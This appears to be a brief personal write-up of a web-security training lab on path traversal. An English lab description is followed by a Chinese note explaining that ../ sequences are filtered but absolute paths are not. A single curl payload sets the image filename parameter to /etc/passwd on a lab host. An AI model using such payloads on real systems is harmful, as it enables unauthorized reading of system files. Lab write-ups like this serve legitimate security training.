# Lab: File path traversal, traversal sequences blocked with absolute path bypass

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

## LFI
* 這一題說會過濾 traversal 的部份，理論上就是 ../ 的部份，但是會視給的 filename 提供的目錄為 default 目錄
```
payload = curl https://ac9c1f6e1f675097c06abaee008a006c.web-security-academy.net/image\?filename\=/etc/passwd
```